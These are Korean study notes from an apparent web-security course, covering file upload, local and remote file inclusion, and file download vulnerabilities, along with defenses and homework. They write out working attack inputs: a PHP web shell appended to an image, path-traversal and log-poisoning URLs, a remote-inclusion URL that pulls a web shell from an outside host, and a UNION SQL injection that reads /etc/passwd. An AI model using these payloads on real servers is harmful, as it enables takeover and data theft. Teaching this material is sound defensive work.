10주차 리뷰

File Upload .
 
Web shell이 가능하게 하느냐가 문제.

취약점 이유   
-> 업로드 되는 파일을 검증하는 것이 없거나 미흡했다.

공격 시나리오    
1. 웹 쉘

웹셀을 업로드할 때 가장 중요한 게 내 파일이 어디에 업로드 되는 지?   
그리고 접근해서 실행하는 것까지 



2. Dos 공격
3. 디페이스 공격. (index.html) index 파일을 업로드해서 메인페이지를 바꿔버리는 공격.
4. 페이지 변조. 피싱 공격. 
5. 악성코드 유포 (XSS)


* 대응 방법!
1. 업로드 되는 파일을 DB에 저장.! 이러면 모든 문제 해결.   
문제가 업로드 되는 파일이 웹서버 안에 저장되어 실행되었기에 문제였음.    
DB Table 안에 바이너리 정보로 들어간다면 실행할 수가 없음.   
-> CLOB / BLOB   

정확하게 말하면 파일 안에 데이터들이 글자로 적혀있는 것일 뿐.   

위 방법으로 사용하면 근본적으로 가능하지만 고객마다 불가능한 경우도 존재함.     
그럼 두 번째 방법을 사용 (차선책)

2. NAS   
웹 서버가 아닌 곳에 파일을 따로 저장.      
웹 서버랑 분리되어 있는 서버에는 실행 엔진이 설치되어 있으면 안됌.(php, jsp 등)   
-> 업로드 파일이 저장되는 서버를 웹 서버와 분리 ! (핵심)

근데 NAS도 안된다고 하면? 세번쨰 ㅋㅋ

3. 파일 검증.   
- 확장자 검증   
- 파일 시그니쳐 검증   
- MIME TYPE 검증   
등등등...   
이런 검증들을 제대로 구현해야 함.   



파일 업로드 BLOB / CLOB 구현해서 직접 DB에 어떻게 저장되고 어떻게 출력되는지 확인해봐라


---
** 이미지 웹 쉘.

.jpg 파일을 올려서 웹서버를 장악한다!!

1. .htaccess
2. LFI (Local File Inclusion)

Local File Inclusion   
.jpg, .txt 다 가능.   

-> 이해하려면 Include 개념을 이해해야 함.


ex)   
include($_GET['page'])

/../../../../../../../etc/passwd   
하면 


파일을 include 함.   
그리고 실행한 다음에 완성된 html을 전달함.

근데 include.php를 include 해버리면 이미 iclude 되어있고 실행되었기 때문에 파일 내용을 볼 수 없음.

그럼 파일 경로 정도만 확인할 수 있나?

하지만 얘는 File Upload의 상위버전임.

파일이 include를 해서 실행되기 떄문에 장점임.




만약에 파일 업로드에 이미지 파일을 업로드함.

1.  
맨 뒤에   
\<?php system($_GET['cmd']); ?>   
구문을 붙임.   

그리고   
/?page=/hackable/uploads/test_image.jpeg&cmd=ls   
/?page=/../hackable/uploads/test_image.jpeg&cmd=ls   
/?page=/../../hackable/uploads/test_image.jpeg&cmd=ls   
계속 내려가면서 해봄.


2.
바이너리 코드를 싹 다 지우고   
<?php system($_GET['cmd']); ?>   
구문을 붙임.

그리고 다시 경로를 붙여서 확인.





근데 왜 file upload 버전의 상위버전일까?

-- 파일을 업로드 하지 않고도 쉘을 딸 수 있다.!    
LFI 만을 가지고도 가능.

-> log 파일.   
access_log 에다가   
<?php system($_GET['cmd']); ?>

그럼 이 기록이 access_log에 저장이 되는 거임   
그럼 이 로그를 부르기만 하면 되는 것임.

/?page=/../../../../../../opt/lampp/logs/access_log&cmd=ls

이렇기 때문에 파일을 업로드하지 않고도 쉘을 가져올 수 있음.

이건 침투테스트에서 자주 사용되는 방법임.

결국 access_log 위치만 찾으면 가능한 것....


3. RFI   
Remote File Inclusion   
간혹가다 외부의 자료를 가져와서 include를 해서 보여주는 경우가 있음.

/?page=http://google.com/

만약 이런 경우가 있다?   
그럼 바로

/?page=http://yws.com/webshell.txt    
include해서 웹쉘 가능.



---
* File Download 취약점.   
: 공격자가 원하는 임의의 파일을 다운로드 할 수 있다.

일반적인 웹서버에 올리고 웹서버에서 다운로드가 가능하다면 file download 취약점은 발생하지 않음.

다만 인가 취약점이 발생할 수 있음.

download.php 파일을 만들어야 함.   
그리고 보통 다운로드 할 때 ?file=/../../../../login.php   
하면 login.php 소스코드를 가져올 수 있음.

경로를 바꿔줌.

다운로드 취약점 성공하면?   
공격자 입장에서는 웹 소스코드를 분석해서 다른 취약점을 찾는다.   
db를 탈취한다.

file download, file download2, web shell 3


---
다운로드 스크립트가 어떻게 되어있나 생각해보자.

<?php fileDownload('./files/userName/' .   
$_GET['path']);   
?>   

??? 먼 소리야

1. 웹쉘을 올린다음   
2. 다운로드허고   
3. 거기서 그 위치를 알아낸 다음에   
4. index.php 받아야 하나요?   
이건 아님. 

그니까 웹쉘을 올릴 필요가 없잖아.   
1번은 전혀 쓸모가 없다.





** 실전에서 다운로드 취약점 찾는 팁   
1. download 스크립트 있는   
download.php   

2. 파라미터로 파일 이름을 받는가?   
파라미터로 파일 경로를 받는가?   
이 2개를 체크해봐야 함.   

간혹가다가 이런 경우 있음   
download.php?idx=2   
파일 경로를 받는 게 아니라 숫자를 받아서 db에서 조회를 해서 그 파일을 가져옴.   
결국 취약점을 찾을 필요가 없다. 불가능하기 때문에.

자 그럼   
만약..?   
인덱스 번호로 다운로드하는 거에서   
sql injection이 일어난다면???   
다운로드 취약점 가능할 수도 있다.   
어떻게 할까?   
만약에    
select path from board where idx={}   
이런 문구라면?    
idx=0 union select '/etc/passwd'    
이렇게 sql injection을 한다면?   
'/etc/passwd' 에 원하는 경로를 찾아서 확인할 수 있겠다.   







** 파일 다운로드 취약점 대응방안   
1. DB에다가 파일을 올리게 하는 것.   

download.php 자체가   
select ~~ 하면서 파일을 전달해줄 것임.   
서버측 소스코드를 전달해줄 방법이 없어짐.

근본적인 방법!!!!!!

2. NAS 처럼 웹 서버와 분리를 하는 것.

3. 디렉토리 트레버져.(임시방편)   
../../../ 자체를 못쓰게 막아버림   
오해가 될 수도 있다? 무슨 오해?

세 번째 방법은 권장하지 않음. 우회 가능한 포인트가 있을 수 있기 때문에

그 우회 가능한 포인트가? File Download 2 문제임... 아하..ㅋㅋ


---
과제   
1. 파일 업로드 다운로드 기능 구현.   
2. 파일 업로드 BLOB / CLOB 구현.   
3. CTF Bad File 문제 풀이   
-> word 정리. 보고서 쓰듯이. 스스로에게 쓰듯이 정리한다고 볼 수 있게 써라    
4. 개발 : 문의 게시판. (비회원), 게시판 비밀번호. 본인만 수정, 삭제할 수 있게 (비회원)
